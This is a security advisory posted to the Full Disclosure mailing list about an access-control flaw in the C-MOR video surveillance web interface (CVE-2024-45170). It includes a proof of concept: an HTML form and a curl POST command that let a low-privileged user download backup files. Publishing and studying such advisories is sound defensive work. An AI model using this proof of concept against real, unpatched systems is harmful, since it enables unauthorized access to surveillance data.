---
title: [SYSS-2024-024]: C-MOR Video Surveillance - Improper Access Control (CWE-284)
url: https://seclists.org/fulldisclosure/2024/Sep/12
source: Full Disclosure
date: 2024-09-07
fetch_date: 2025-10-06T18:31:16.790783
---

# [SYSS-2024-024]: C-MOR Video Surveillance - Improper Access Control (CWE-284)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2024-024]: C-MOR Video Surveillance - Improper Access Control (CWE-284)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 4 Sep 2024 08:12:06 +0200

---

```
Advisory ID:               SYSS-2024-024
Product:                   C-MOR Video Surveillance
Manufacturer:              za-internet GmbH
Affected Version(s):       5.2401
Tested Version(s):         5.2401
Vulnerability Type:        Improper Access Control (CWE-284)
Risk Level:                High
Solution Status:           Fixed
Manufacturer Notification: 2024-04-05
Solution Date:             2024-07-31
Public Disclosure:         2024-09-04
CVE Reference:             CVE-2024-45170
Authors of Advisory:       Chris Beiter, Frederik Beimgraben,
                           and Matthias Deeg

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The software product C-MOR is an IP video surveillance system.

The manufacturer describes the product as follows:

"With C-MOR video surveillance, it is possible to check your
surveillance over network and the Internet. You can access the live
view as well as previous recordings from any PC or mobile device.
C-MOR is managed and controlled over the C-MOR web interface.
IP settings, camera recording setup, user rights and so on are set
over the web without the installation of any software on the
client."[1]

Due to improper or missing access control, low-privileged users can
use administrative functions of the C-MOR web interface.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

By analyzing the C-MOR web interface, it was found that different
functions are only available to administrative users.

However, access to those functions is restricted via the web application
user interface and not checked on the server side.

Thus, by sending corresponding HTTP requests to the web server of the
C-MOR web interface, low-privileged users can also use administrative
functionality, for instance downloading backup files or changing
configuration settings.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

In this example, a low-privileged user downloads backup files by
directly sending a corresponding HTTP POST request to the page
"download-bkf.pml".

For this, the following HTML code can be used:

<html>
    <body>
        <form action="https://<HOST>/download-bkf.pml" method="POST">
```

 <input type="text" name="bkf" value="" placeholder="Please
insert the file name." /><br>

```
            <input type="submit" value="Download">
        </form>
    </body>
</html>

This PoC attack can also be performed using the following curl command:
```

curl -X POST -d '<FILENAME>' --user '<USERNAME:PASSWORD>' --ciphers
'DEFAULT:!DH' https://<HOST>/download-bkf.pml

```
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

Install C-MOR Video Surveillance version 6.00PL1.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2024-04-05: Vulnerability reported to manufacturer
2024-04-05: Manufacturer acknowledges receipt of security advisories
2024-04-08: Exchange regarding security updates and disclosure timeline
2024-05-08: Further exchange concerning security updates and disclosure
            timeline; public release of all security advisories
            scheduled for release of C-MOR Video Surveillance version 6
2024-05-10: Release of C-MOR software version 5.30 with security updates
            for some reported security issues
2024-07-19: E-mail to manufacturer concerning release date of C-MOR
            Video Surveillance version 6; response with planned
            release date of 2024-08-01
2024-07-30: E-mail from manufacturer with further information
            concerning security fixes
2024-07-31: Release of C-MOR software version 6.00PL1
2024-09-04: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] Product website for C-MOR Video Surveillance
    https://www.c-mor.com/
[2] SySS Security Advisory SYSS-2024-024

https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-024.txt
[3] SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Chris Beiter, Frederik
Beimgraben.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
```

**Attachment:
[OpenPGP\_signature.asc](att-12/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

### Current thread:

* **[SYSS-2024-024]: C-MOR Video Surveillance - Improper Access Control (CWE-284)** *Matthias Deeg via Fulldisclosure (Sep 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)
...